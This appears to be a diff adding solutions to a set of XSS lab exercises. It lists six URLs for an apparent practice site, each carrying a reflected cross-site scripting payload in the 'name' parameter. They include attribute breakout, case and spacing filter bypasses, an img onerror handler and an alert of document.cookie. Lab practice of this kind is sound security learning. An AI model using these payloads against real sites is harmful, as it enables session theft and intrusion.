@@ -1,0 +1,19 @@
+Ex1:
+https://labo.poney.pink/v01/xss/ex1a/?name=<script>alert("I hacked you")</script>
+
+Ex2:
+https://labo.poney.pink/v01/xss/ex1b/?name=" onmouseover="alert('I hacked you')"
+OR
+https://labo.poney.pink/v01/xss/ex1b/?name=""><script>alert("I hacked you")</script>
+
+Ex3:
+https://labo.poney.pink/v01/xss/ex1a/?name=<script>alert(document.cookie)</script>
+
+Ex4:
+https://labo.poney.pink/v01/xss/ex1d/?name=<SCRIPT>alert("I hacked you")</SCRIPT>
+
+Ex5:
+https://labo.poney.pink/v01/xss/ex1e/?name=<SCRIPT   a="">alert("I hacked you")</SCRIPT   >
+
+Ex6:
+https://labo.poney.pink/v01/xss/ex1f/?name=<img src="/404.png" onerror="alert('I hacked you')"/>
